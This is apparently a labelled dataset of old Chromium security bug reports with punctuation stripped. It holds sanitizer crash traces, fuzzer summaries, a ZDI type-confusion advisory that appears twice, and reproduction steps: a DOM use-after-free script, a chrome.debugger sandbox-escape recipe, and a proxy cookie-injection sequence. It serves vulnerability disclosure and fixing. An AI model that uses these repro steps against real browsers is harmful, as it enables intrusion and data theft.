redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 6026==aborting version chrome version asan-linux-release-314508 operating system linux 64bit reproduction case script function start if gc gc o94=document.body o2510=document.createelement script o2510.src=null o2518=document.createelement b o2518.appendchild o94 o2672=document.documentelement o2775=document.createelement iframe o2775.onload=cb_nodeiframes_1523_1 o2672.appendchild o2775 function cb_nodeiframes_1523_1 o2777=this.contentdocument o2810=document.documentelement o2814=document.createelement iframe o2814.onload=cb_nodeiframes_1645_1 o2810.appendchild o2814 function cb_nodeiframes_1645_1 o2845=document.createelement li o94.appendchild o2845 o2864=o2777.implementation.createdocument b null o2867=o2864.implementation.createdocument a null o2884=o2867.createelement div o94.appendchild o2510 o2884.appendchild o94.parentnode o3028=o2845.clonenode true o2814.appendchild o94 o3028.appendchild o94 o2814.appendchild o2510 gc location.reload true script body onload start body for crashes please include the following additional information type of crash tab	11
security integer overflow in webgl vulnerability details when calling teximage2d in javascript it will call webglrenderingcontextbase teximage2d if the image type is svg it will drawimageintobuffer during which a large image width will cause multiply integer overflow javascript textureimage.width gl.teximage2d 0 0 0 0 0 textureimage e depot_tools\src\third_party\webkit\source\core\html\canvas\webglrenderingcontextbase.cpp void webglrenderingcontextbase teximage2d glenum target glint level glenum internalformat glenum format glenum type htmlimageelement image exceptionstate exceptionstate if imageforrender issvgimage imageforrender drawimageintobuffer imageforrender.get image width image height teximage2d e depot_tools\src\third_party\skia\src\core\skmallocpixelref.cpp skmallocpixelref skmallocpixelref newallocate const skimageinfo info size_t requestedrowbytes skcolortable ctable info fwidth fheight int32_t minrb sktos32 info.minrowbytes overflow see minrowbytes minrb rowbytes minrb int64_t bigsize int64_t info.height rowbytes size_t size sk_64_ass32 bigsize skassert size info.getsafesize rowbytes void addr sk_malloc_flags size 0 allocate memory with overflowed size size_t minrowbytes const return size_t this minrowbytes64 return uint64_t minrowbytes64 const return sk_64_mul fwidth this bytesperpixel fwidth this bytesperpixel return call stack skia.dll skmallocpixelref newallocate const skimageinfo info unsigned int requestedrowbytes skcolortable ctable skia.dll sksurface newraster const skimageinfo info const sksurfaceprops props blink_platform.dll blink unacceleratedimagebuffersurface unacceleratedimagebuffersurface const blink intsize size blink opacitymode opacitymode=nonopaque blink_platform.dll blink imagebuffer create const blink intsize size blink opacitymode opacitymode=nonopaque blink_web.dll blink webglrenderingcontextbase lruimagebuffercache imagebuffer const blink intsize size blink_web.dll blink webglrenderingcontextbase drawimageintobuffer blink image image int width int height const char functionname blink_web.dll blink webglrenderingcontextbase teximage2d unsigned int target int level unsigned int internalformat unsigned int format unsigned int type blink htmlimageelement image blink exceptionstate exceptionstate blink_web.dll blink webglrenderingcontextv8internal teximage2d3method const v8 functioncallbackinfo v8 value info blink_web.dll blink webglrenderingcontextv8internal teximage2dmethod const v8 functioncallbackinfo v8 value info blink_web.dll blink webglrenderingcontextv8internal teximage2dmethodcallback const v8 functioncallbackinfo v8 value info v8.dll v8 internal functioncallbackarguments call void const v8 functioncallbackinfo v8 value v8.dll v8 internal handleapicallhelper 0 v8 internal anonymous-namespace builtinarguments 1 args v8 internal isolate isolate v8.dll v8 internal builtin_handleapicall int args_length v8 internal object args_object v8 internal isolate isolate javascript jit code version chrome version 41.0.2246.0 dev operating system windows 7 ultimate 64-bit service pack 1 reproduction case attachment	11
heap-use-after-free in void blink imagedecodingstore insertcacheinternal blink imagedecodingsto useragent mozilla/5.0 x11 linux x86_64 rv:36.0 gecko/20100101 firefox/36.0 steps to reproduce the problem 1 chrome-asan ch-uaf-doublylinkedlistnode.gif what is the expected behavior tab lives what went wrong tab dies did this work before n/a chrome version 41.0.2234.0 developer build channel n/a os version flash version 6618==error addresssanitizer heap-use-after-free on address at pc bp sp write of size 8 at thread t6 compositorraste 0 in wtf doublylinkedlistnode blink imagedecodingstore cacheentry setnext blink imagedecodingstore cacheentry mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/doublylinkedlist.h:56 1 in wtf doublylinkedlist blink imagedecodingstore cacheentry append blink imagedecodingstore cacheentry mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/doublylinkedlist.h:156 2 in void blink imagedecodingstore insertcacheinternal blink imagedecodingstore decodercacheentry wtf hashmap std 1 pair blink imageframegenerator const sktsize int wtf ownptr blink imagedecodingstore decodercacheentry wtf pairhash blink imageframegenerator const sktsize int wtf hashtraits std 1 pair blink imageframegenerator const sktsize int wtf hashtraits wtf ownptr blink imagedecodingstore decodercacheentry wtf defaultallocator wtf hashmap blink imageframegenerator const wtf hashset std 1 pair blink imageframegenerator const sktsize int wtf pairhash blink imageframegenerator const sktsize int wtf hashtraits std 1 pair blink imageframegenerator const sktsize int wtf defaultallocator wtf ptrhash blink imageframegenerator const wtf hashtraits blink imageframegenerator const wtf hashtraits wtf hashset std 1 pair blink imageframegenerator const sktsize int wtf pairhash blink imageframegenerator const sktsize int wtf hashtraits std 1 pair blink imageframegenerator const sktsize int wtf defaultallocator wtf defaultallocator wtf passownptr blink imagedecodingstore decodercacheentry wtf hashmap std 1 pair blink imageframegenerator const sktsize int wtf ownptr blink imagedecodingstore decodercacheentry wtf pairhash blink imageframegenerator const sktsize int wtf hashtraits std 1 pair blink imageframegenerator const sktsize int wtf hashtraits wtf ownptr blink imagedecodingstore decodercacheentry wtf defaultallocator wtf hashmap blink imageframegenerator const wtf hashset std 1 pair blink imageframegenerator const sktsize int wtf pairhash blink imageframegenerator const sktsize int wtf hashtraits std 1 pair blink imageframegenerator const sktsize int wtf defaultallocator wtf ptrhash blink imageframegenerator const wtf hashtraits blink imageframegenerator const wtf hashtraits wtf hashset std 1 pair blink imageframegenerator const sktsize int wtf pairhash blink imageframegenerator const sktsize int wtf hashtraits std 1 pair blink imageframegenerator const sktsize int wtf defaultallocator wtf defaultallocator mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/imagedecodingstore.cpp:224 3 in blink imagedecodingstore insertdecoder blink imageframegenerator const wtf passownptr blink imagedecoder mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/imagedecodingstore.cpp:103 4 in blink imageframegenerator trytoresumedecode sktsize int const unsigned long mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/imageframegenerator.cpp:253 5 in blink imageframegenerator decodeandscale skimageinfo const unsigned long void unsigned long mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/imageframegenerator.cpp:134 6 in ongetpixels mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/graphics/decodingimagegenerator.cpp:82	11
unknown in blink sqlstatementbackend execute detailed report fuzzer therealholden_worker job type linux_asan_chrome_v8_arm crash type unknown crash address crash state blink sqlstatementbackend execute blink sqltransactionbackend runcurrentstatementandgetnextstate blink sqltransactionbackend runstatements regressed minimized testcase 1.84 kb additional requirements requires gestures additional requirements requires http filer mbarbella	11
heap-use-after-free in content serviceworkerscriptcachemap notifyfinishedcaching detailed report fuzzer therealholden_worker job type windows_asan_chrome crash type heap-use-after-free read 4 crash address crash state content serviceworkerscriptcachemap notifyfinishedcaching content serviceworkerwritetocachejob kill net urlrequest docancel unminimized testcase additional requirements requires http filer inferno	11
heap use after free blink basemultiplefieldsdateandtimeinputtype readonlyattributechanged vulnerability details 5060==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in blink basemultiplefieldsdateandtimeinputtype readonlyattributechanged c b\build\slave\win_asan_release\build\src\third_party\webkit\source\wtf\rawptr.h:119 1 in blink htmlinputelement parseattribute c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp:711 2 in blink element attributechanged c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\element.cpp:1083 3 in blink element didaddattribute c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\element.cpp:2946 4 in blink element appendattributeinternal c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\element.cpp:2087 5 in blink element setattribute c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\element.cpp:1044 6 in blink element setbooleanattribute c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\dom\element.cpp:330 7 in blink mediaquerylistevent create c b\build\slave\win_asan_release\build\src\out\release\gen\blink\bindings\core\v8\v8htmlfieldsetelement.cpp:63 8 in v8 internal propertycallbackarguments call c b\build\slave\win_asan_release\build\src\v8\src\arguments.cc:89 9 in v8 internal object setpropertywithaccessor c b\build\slave\win_asan_release\build\src\v8\src\objects.cc:371 10 in v8 internal object setproperty c b\build\slave\win_asan_release\build\src\v8\src\objects.cc:2826 11 in v8 internal storeic store c b\build\slave\win_asan_release\build\src\v8\src\ic\ic.cc:1585 12 in v8 internal storeic_miss c b\build\slave\win_asan_release\build\src\v8\src\ic\ic.cc:2390 output from windbg chrome_child wtf ownptr blink documentorderedmap operator inlined in chrome_child blink basemultiplefieldsdateandtimeinputtype disabledattributechanged 687c1a19 8b4e14 mov ecx dword ptr esi+14h ds:002b:00000044 version stable asan-win32-release-314088 operating system windows 7 sp1 reproduction case please open attached html file type of crash tab this issue in stack trace is a little related to already patched issue number 447906 but the way of triggering it is totally different thats why i decided to post it as another issue	11
heap-buffer-overflow in media copyplane useragent mozilla/5.0 x11 ubuntu linux x86_64 rv:35.0 gecko/20100101 firefox/35.0 steps to reproduce the problem 1 chrome-asan ch-bofr-copyplane.webm what is the expected behavior what went wrong 21491==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 854 at thread t5 media 0 in asan_memcpy 1 in copyplane mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release media/base/video_util.cc:47 2 in media vpxvideodecoder copyvpximageto vpx_image const vpx_image const scoped_refptr media videoframe mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release media/filters/vpx_video_decoder.cc:505 3 in media vpxvideodecoder vpxdecode scoped_refptr media decoderbuffer const scoped_refptr media videoframe mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release media/filters/vpx_video_decoder.cc:438 4 in media vpxvideodecoder decodebuffer scoped_refptr media decoderbuffer const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release media/filters/vpx_video_decoder.cc:351 5 in media vpxvideodecoder decode scoped_refptr media decoderbuffer const base callback void media videodecoder status const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release media/filters/vpx_video_decoder.cc:324 6 in media decoderstream media demuxerstream type 2 decode scoped_refptr media decoderbuffer const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release media/filters/decoder_stream.cc:296 7 in media decoderstream media demuxerstream type 2 onbufferready media demuxerstream status scoped_refptr media decoderbuffer const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release media/filters/decoder_stream.cc:483 did this work before n/a chrome version 42.0.2281.0 developer build 64-bit channel dev os version 3.13.0 flash version checked that this reproduces on two linux machines and seems to reproduce way back in r250226 but not in r200032 the issue should turn up every time after the video played for about a second	9
security extensions can silently debug run code in any tab and escape the sandbox vulnerability details please provide a brief explanation of the security issue the chrome.debugger extension api can attach to targets at any origin including urls such as file chrome chrome-extension and the chrome web store attaching to privileged targets is usually forbidden when the target is specified by tabid or extensionid however it is also possible to attach to a target by targetid which is not subjected to any validation this targetid can easily be obtained using the chrome.debugger.gettargets method method-gettargets usually background extensions can not be debugged unless silent-debugger-extension-api is set however this limitation can easily be avoided by opening chrome-extension extensionid manifest.json this file always exists and an extension can always open this url hence any installed extension that has access to juicy apis can be abused by this bug because of these capabilities anything that can be displayed in a tab is completely compromised when a user installs an extension that exploits this bug here are some severe attacks that can be carried out when i write open x i mean open x in a tab attach a debugger and run code to realise the remaining steps chrome os only full system compromise if the user has installed the secure shell extension which uses the private chrome.terminalprivate api which offers direct access to a shell unconstrained read access to local files 1 open chrome extensions 2 enable allow access to file urls chrome.send extensionsettingsallowfileaccess extensionid true 3 use xmlhttprequest to scrape the disk query the location of the chrome binary and user profile directory 1 open chrome version 2 scrape the data write access to local files 1 open chrome settings-frame 2 set the download directory to any location chrome.send setstringpref download.default_directory home 3 use the chrome.downloads.download extension api to save files to any subdirectory chrome.downloads.download url data text/plain i commited a crime filename username/confession.txt execute random files outside the sandbox 1 open chrome settings-frame 2 set the download directory to a file chrome.send setstringpref download.default_directory c windows\\\\system32\\\\notepad.exe 3 open chrome downloads 4 open the downloads directory chrome.send opendownloadsfolder theft of encryption keys and other sensitive data from extensions 1 open chrome-extension extensionid manifest.json 2 if the data is hidden at the background page var data chrome.extension.getbackgroundpage gettopsecretinformationfromextension 3 if the data is just stored in localstorage chrome.storage indexeddb filesystem api or whatever invoke any of these apis to access the data version chrome version chromium 40.0.2214.91 google chrome 42.0.2300.0 operating system linux x64 but applicable to any os reproduction case please include a demonstration of the security bug such as an attached html or binary file that reproduces the bug when loaded in chrome please make the file as small as possible and remove any content not required to demonstrate the bug i ve attached an extension that uses the following permissions debugger to get access to the api required management to query the list of installed extensions to find a target for the proof of concept not necessary in reality because the list of extensions is also available in chrome.debugger.gettargets 1 make sure that you have installed at least one other extension 2 load the attached extension 3 upon load it picks another extension and invokes alert to open a dialog in the context of another extension 4 observe a dialog that is displayed in another extension this steps-to-reproduce is safe to run it proves that there is a vulnerability in the chrome.debugger api if you want to check whether the other scenarios are true just open the console and run the shown commands after all the chrome.debugger api can do anything what the console is capable of some pointers for resolving the problem 1 obviously check whether the debuggee target should be accessible that has to be done here 530 2 the sandbox escape bug can be mitigated by checking whether the download directory is really a directory before saving the pref 140 3 and perhaps also before opening it because the directory might be replaced with a file between setting and using the pref e.g due to sync 558 4 and also in the chrome.downloads.showdefaultfolder extension api 1329	2
use-of-uninitialized-value in skpremultiplyargb detailed report fuzzer cdiehl_peach job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state skpremultiplyargb blink dragimage dissolvetofraction blink dragcontroller startdrag minimized testcase 140.23 kb additional requirements requires gestures filer inferno	11
use-of-uninitialized-value in unsigned int blink simpleshaper advanceinternal blink surrogatepairaware detailed report fuzzer miaubiz_css_fuzzer job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state unsigned int blink simpleshaper advanceinternal blink surrogatepairaware blink simpleshaper advance blink font buildglyphbuffer minimized testcase 6.58 kb filer inferno	11
security cookie injection by proxy with 407 response chrome mistakenly accepts cookies in a 407 response of connect request from proxy version chrome version all operating system all reproduction case 1 set up a http proxy in chrome 2 navigate to chrome actually sends a connect request connect mail.google.com:443 http/1.1 host mail.google.com 3 the proxy responds a 407 message including set-cookie headers http/1.1 407 proxy authentication required proxy-authenticate basic realm=auth set-cookie sid=malicious domain=.mail.google.com path secure 4 chrome mistakenly accepts the malicious cookies	9
zdi-can-2662 google chrome v8eventlistenerlist findorcreatewrapper type confusion remote code execution vulnerability useragent mozilla/5.0 windows nt 6.3 wow64 trident/7.0 net4.0e net4.0c tablet pc 2.0 rv:11.0 like gecko steps to reproduce the problem zdi-can-2662 google chrome v8eventlistenerlist findorcreatewrapper type confusion remote code execution vulnerability cvss 6.8 av n/ac m/au n/c p/i p/a p abstract hp s zero day initiative has identified a vulnerability affecting the following products google chrome vulnerability details tested on win8.1/chrome 41.0.2249.0 the problem starts from here template typename wrappertype passrefptr v8eventlistener v8eventlistenerlist findorcreatewrapper v8 local v8 value value bool isattribute scriptstate scriptstate v8 isolate isolate scriptstate isolate assert isolate incontext if value isobject non-callable attribute setter input is treated as null no wrapper isattribute amp amp value isfunction return nullptr v8 local v8 object object v8 local v8 object cast value v8 handle v8 string wrapperproperty gethiddenproperty isattribute isolate v8eventlistener wrapper dofindwrapper object wrapperproperty scriptstate if wrapper return wrapper refptr v8eventlistener wrapperptr wrappertype create object isattribute scriptstate if wrapperptr object sethiddenvalue wrapperproperty v8 external new isolate wrapperptr.get return wrapperptr then static v8eventlistener dofindwrapper v8 local v8 object object v8 handle v8 string wrapperproperty scriptstate scriptstate v8 handlescope scope scriptstate isolate assert scriptstate isolate incontext v8 local v8 value listener object gethiddenvalue wrapperproperty if listener.isempty return 0 return static_cast v8eventlistener v8 external cast listener value the listener will contain a pointer to audiolistener rather than v8eventlistener which results in a bad cast 754.ea0 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=11fb6d00 ebx=0014ec60 ecx=00000001 edx=00000001 esi=0014ed88 edi=03e872b4 eip=5c42876a esp=0014ebfc ebp=0014ec2c iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 error symbol file could not be found defaulted to export symbols for c users\zdi\appdata\local\google\chrome sxs\application\41.0.2231.0\chrome_child.dll chrome_child ovly_debug_event 5c42876a ff4004 inc dword ptr eax+4 ds:0023:11fb6d04 5:058 dd eax 11fb6d00 11fb6d10 11fb6d20 11fb6d30 11fb6d40 11fb6d50 11fb6d60 11fb6d70 5:058 g modload 68300000 6830a000 c windows\system32\linkinfo.dll 754.ea0 access violation code c0000005 second chance eax=11fb6d00 ebx=0014ec60 ecx=00000001 edx=00000001 esi=0014ed88 edi=03e872b4 eip=5c42876a esp=0014ebfc ebp=0014ec2c iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 chrome_child ovly_debug_event 5c42876a ff4004 inc dword ptr eax+4 ds:0023:11fb6d04 5:058 g modload 75060000 75072000 c windows\system32\imagehlp.dll modload 66d80000 66e20000 c windows\system32\ntshrui.dll 754.ea0 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=11fb6d00 ebx=0014ec60 ecx=00000001 edx=00000001 esi=0014ed88 edi=03e872b4 eip=5c42876a esp=0014ebfc ebp=0014ec2c iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 chrome_child ovly_debug_event 5c42876a ff4004 inc dword ptr eax+4 ds:0023:11fb6d04 5:058 u chrome_child ovly_debug_event 5c42876a ff4004 inc dword ptr eax+4 5c42876d 8903 mov dword ptr ebx eax 5c42876f 8bc3 mov eax ebx 5c428771 5f pop edi 5c428772 5e pop esi 5c428773 5b pop ebx 5c428774 8be5 mov esp ebp 5c428776 5d pop ebp 5:058 kvb childebp retaddr args to child warning stack unwind information not available following frames may be wrong 0014ec2c 5c428675 0014ed88 3ab87f40 0014eccc chrome_child ovly_debug_event 0014ec48 5c428362 0014eca4 3ab87f40 0014ed88 chrome_child ovly_debug_event 0014ecac 5c4281d5 0014ece8 5c3be288 0014eccc chrome_child ovly_debug_event 0014ecb4 5c3be288 0014eccc 03fb00e8 5c4281bf chrome_child ovly_debug_event 0014ece8 5c3be100 0014ed10 5c4281bf 00000004 chrome_child ovly_debug_event 0014ed50 5c3bdf4a 00000004 0014ed90 0014ed7c chrome_child ovly_debug_event 0014edfc 5c3398da 16856ee0 2413396d 3ef81d2d chrome_child ovly_debug_event 0014ee48 5c339757 03e8728c 03e87294 00000000 chrome_child ovly_debug_event 0014ee84 5c405e1d 03e8728c 03e87294 00000000 chrome_child ovly_debug_event 0014eecc 5c40e04a 0014eef4 00000000 03e8728c chrome_child ovly_debug_event 0014ef18 5c40aa5e 03e8728c 3f20406c 3aa88000 chrome_child ovly_debug_event 7:070 lmvm chrome start end module name 00a60000 00b37000 chrome deferred image path chrome.exe image name chrome.exe timestamp sat dec 13 07:32:04 2014 548c5bf4 checksum 000d4a13 imagesize 000d7000 file version 41.0.2249.0 product version 41.0.2249.0 file flags 0 mask 17 file os 4 unknown win32 file type 1.0 app file date 00000000.00000000 translations 0409.04b0 companyname google inc productname google chrome internalname chrome_exe originalfilename chrome.exe productversion 41.0.2249.0 fileversion 41.0.2249.0 filedescription google chrome legalcopyright copyright 2012 google inc all rights reserved 7:070 vertarget windows 7 version 9200 up free x86 compatible product winnt suite singleuserts kernel32.dll version 6.3.9600.17031 winblue_gdr.140221-1952 machine name debug session time mon dec 15 07:13:21.050 2014 gmt-8 system uptime 3 days 11:00:01.235 process uptime 0 days 0:00:36.334 kernel time 0 days 0:00:00.031 user time 0 days 0:00:00.703 credit this vulnerability was discovered by skylined working with hp s zero day initiative further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 120 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 120 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures hp.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint and acquired by hewlett-packard the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used the zdi does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor the zdi provides its hp tippingpoint customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available disclosure policy our vulnerability disclosure policy is available online at what is the expected behavior what went wrong the full report is above did this work before n/a chrome version chrome 41.0.2249.0 channel n/a os version 8.1 flash version predicted disclosure 05/16/2015	11
unknown in blink inlinetextbox islinebreak detailed report fuzzer bj_broddelwerk job type linux_asan_content_shell_drt crash type unknown crash address crash state blink inlinetextbox islinebreak blink inlinetextbox containscaretoffset blink position inrenderedtext regressed minimized testcase 31.24 kb filer inferno	11
assertion failed node node isshadowroot detailed report fuzzer lcamtuf_cross_fuzz job type mac_asan_chrome crash type assert crash address crash state assertion failed node node isshadowroot blink textiterator advance blink characteriterator advance minimized testcase 21.46 kb filer inferno	11
unknown in sa8_alpha_d32_nofilter_dx detailed report fuzzer sugoi_filter_fuzzer job type linux_asan_filter_fuzz_stub_32bit crash type unknown crash address crash state sa8_alpha_d32_nofilter_dx skbitmapprocshader bitmapprocshadercontext shadespan ska8_shader_blitter blith regressed minimized testcase 0.66 kb filer inferno	11
security oob read in dhcpcd the dhcp client has a bug in external/dhcpcd/dhcp.c:305 get_option function which does dhcp message option parsing while p e o p op p 1 l p p l return op dhcp options have a simple type length value format type and length are 8-bit and length specifies the number of bytes after the length byte the code checks that the beginning of an option is within bounds but the option body can be out-of-bounds the options buffer is the last field of a struct dhcp_message struct dhcp_message uint32_t xid transaction id uint16_t secs elapsed time in sec from boot uint32_t ciaddr previously allocated client ip uint32_t yiaddr your client ip address uint32_t cookie uint8_t options dhcp_option_len message options cookie packed this struct is allocated by dlmalloc so reading oob from options reads into the next dlmalloc chunk	11
tracking bug for internal fixes chrome m41 release 0 critical high medium low	11
security gaiaauthextension is too powerful and should validate parameter we received a full chain exploit in chrome from an external researcher in issue 453937 he used a uxss and was able to jump to the component extension process by leveraging gaiaauthextension could gaiaauthextension be made less powerful would it be possible to whitelist gaiaurl parameters or at least restrict them any other step that you could think of quoting verbatim the short second part is the transition from the ntp process to the component extension process there is an internal component extension in chrome called gaiaauthextension the main page of the extension accepts the gaiaurl uri parameter as the source url for the iframe element that s a good candidate for the transition however that extension is only accessible when the chrome chrome-signin page is opened in the browser so the whole algorithm is 6 open chrome chrome-signin in a new tab 7 open the gaiaauthextension main page with the third part of the exploit encoded as a data url in the gaiaurl param gaiaauthextension is a very powerful extension for example it has the permission to control all chrome pages the third part of exploit uses that power to gain rce 8 uxss the top frame the extension implements csp so window.function would n't work to bypass it the exploit gets the getownpropertydescriptor function from the exception object and then calls it on the top window object to read the url and document properties url is used to create a new blob url with the extension s security origin and document to inject a new script element with its src attribute set to the blob url	11
security html imports ignores content-type and content-disposition headers vulnerability details loading of html imports with link rel=import ignores content-type and content-disposition headers of the target resource version chrome version 39.0.2171.71 stable operating system windows 7 professional service pack 1 reproduction case launch this page has following two link tags link rel import href content-disposition/index.html link rel import href content-disposition/index.txt both are protected by content-disposition and the content-type of the latter index.txt is text/plain however both files are loaded as html imports to the master document loader.html and scripts in them are executed	11
zdi-can-2662 google chrome v8eventlistenerlist findorcreatewrapper type confusion remote code execution vulnerability useragent mozilla/5.0 windows nt 6.3 wow64 trident/7.0 net4.0e net4.0c tablet pc 2.0 rv:11.0 like gecko steps to reproduce the problem zdi-can-2662 google chrome v8eventlistenerlist findorcreatewrapper type confusion remote code execution vulnerability cvss 6.8 av n/ac m/au n/c p/i p/a p abstract hp s zero day initiative has identified a vulnerability affecting the following products google chrome vulnerability details tested on win8.1/chrome 41.0.2249.0 the problem starts from here template typename wrappertype passrefptr v8eventlistener v8eventlistenerlist findorcreatewrapper v8 local v8 value value bool isattribute scriptstate scriptstate v8 isolate isolate scriptstate isolate assert isolate incontext if value isobject non-callable attribute setter input is treated as null no wrapper isattribute amp amp value isfunction return nullptr v8 local v8 object object v8 local v8 object cast value v8 handle v8 string wrapperproperty gethiddenproperty isattribute isolate v8eventlistener wrapper dofindwrapper object wrapperproperty scriptstate if wrapper return wrapper refptr v8eventlistener wrapperptr wrappertype create object isattribute scriptstate if wrapperptr object sethiddenvalue wrapperproperty v8 external new isolate wrapperptr.get return wrapperptr then static v8eventlistener dofindwrapper v8 local v8 object object v8 handle v8 string wrapperproperty scriptstate scriptstate v8 handlescope scope scriptstate isolate assert scriptstate isolate incontext v8 local v8 value listener object gethiddenvalue wrapperproperty if listener.isempty return 0 return static_cast v8eventlistener v8 external cast listener value the listener will contain a pointer to audiolistener rather than v8eventlistener which results in a bad cast 754.ea0 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=11fb6d00 ebx=0014ec60 ecx=00000001 edx=00000001 esi=0014ed88 edi=03e872b4 eip=5c42876a esp=0014ebfc ebp=0014ec2c iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 error symbol file could not be found defaulted to export symbols for c users\zdi\appdata\local\google\chrome sxs\application\41.0.2231.0\chrome_child.dll chrome_child ovly_debug_event 5c42876a ff4004 inc dword ptr eax+4 ds:0023:11fb6d04 5:058 dd eax 11fb6d00 11fb6d10 11fb6d20 11fb6d30 11fb6d40 11fb6d50 11fb6d60 11fb6d70 5:058 g modload 68300000 6830a000 c windows\system32\linkinfo.dll 754.ea0 access violation code c0000005 second chance eax=11fb6d00 ebx=0014ec60 ecx=00000001 edx=00000001 esi=0014ed88 edi=03e872b4 eip=5c42876a esp=0014ebfc ebp=0014ec2c iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 chrome_child ovly_debug_event 5c42876a ff4004 inc dword ptr eax+4 ds:0023:11fb6d04 5:058 g modload 75060000 75072000 c windows\system32\imagehlp.dll modload 66d80000 66e20000 c windows\system32\ntshrui.dll 754.ea0 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=11fb6d00 ebx=0014ec60 ecx=00000001 edx=00000001 esi=0014ed88 edi=03e872b4 eip=5c42876a esp=0014ebfc ebp=0014ec2c iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 chrome_child ovly_debug_event 5c42876a ff4004 inc dword ptr eax+4 ds:0023:11fb6d04 5:058 u chrome_child ovly_debug_event 5c42876a ff4004 inc dword ptr eax+4 5c42876d 8903 mov dword ptr ebx eax 5c42876f 8bc3 mov eax ebx 5c428771 5f pop edi 5c428772 5e pop esi 5c428773 5b pop ebx 5c428774 8be5 mov esp ebp 5c428776 5d pop ebp 5:058 kvb childebp retaddr args to child warning stack unwind information not available following frames may be wrong 0014ec2c 5c428675 0014ed88 3ab87f40 0014eccc chrome_child ovly_debug_event 0014ec48 5c428362 0014eca4 3ab87f40 0014ed88 chrome_child ovly_debug_event 0014ecac 5c4281d5 0014ece8 5c3be288 0014eccc chrome_child ovly_debug_event 0014ecb4 5c3be288 0014eccc 03fb00e8 5c4281bf chrome_child ovly_debug_event 0014ece8 5c3be100 0014ed10 5c4281bf 00000004 chrome_child ovly_debug_event 0014ed50 5c3bdf4a 00000004 0014ed90 0014ed7c chrome_child ovly_debug_event 0014edfc 5c3398da 16856ee0 2413396d 3ef81d2d chrome_child ovly_debug_event 0014ee48 5c339757 03e8728c 03e87294 00000000 chrome_child ovly_debug_event 0014ee84 5c405e1d 03e8728c 03e87294 00000000 chrome_child ovly_debug_event 0014eecc 5c40e04a 0014eef4 00000000 03e8728c chrome_child ovly_debug_event 0014ef18 5c40aa5e 03e8728c 3f20406c 3aa88000 chrome_child ovly_debug_event 7:070 lmvm chrome start end module name 00a60000 00b37000 chrome deferred image path chrome.exe image name chrome.exe timestamp sat dec 13 07:32:04 2014 548c5bf4 checksum 000d4a13 imagesize 000d7000 file version 41.0.2249.0 product version 41.0.2249.0 file flags 0 mask 17 file os 4 unknown win32 file type 1.0 app file date 00000000.00000000 translations 0409.04b0 companyname google inc productname google chrome internalname chrome_exe originalfilename chrome.exe productversion 41.0.2249.0 fileversion 41.0.2249.0 filedescription google chrome legalcopyright copyright 2012 google inc all rights reserved 7:070 vertarget windows 7 version 9200 up free x86 compatible product winnt suite singleuserts kernel32.dll version 6.3.9600.17031 winblue_gdr.140221-1952 machine name debug session time mon dec 15 07:13:21.050 2014 gmt-8 system uptime 3 days 11:00:01.235 process uptime 0 days 0:00:36.334 kernel time 0 days 0:00:00.031 user time 0 days 0:00:00.703 credit this vulnerability was discovered by skylined working with hp s zero day initiative further details if supporting files were contained with this report they are provided within a password protected zip 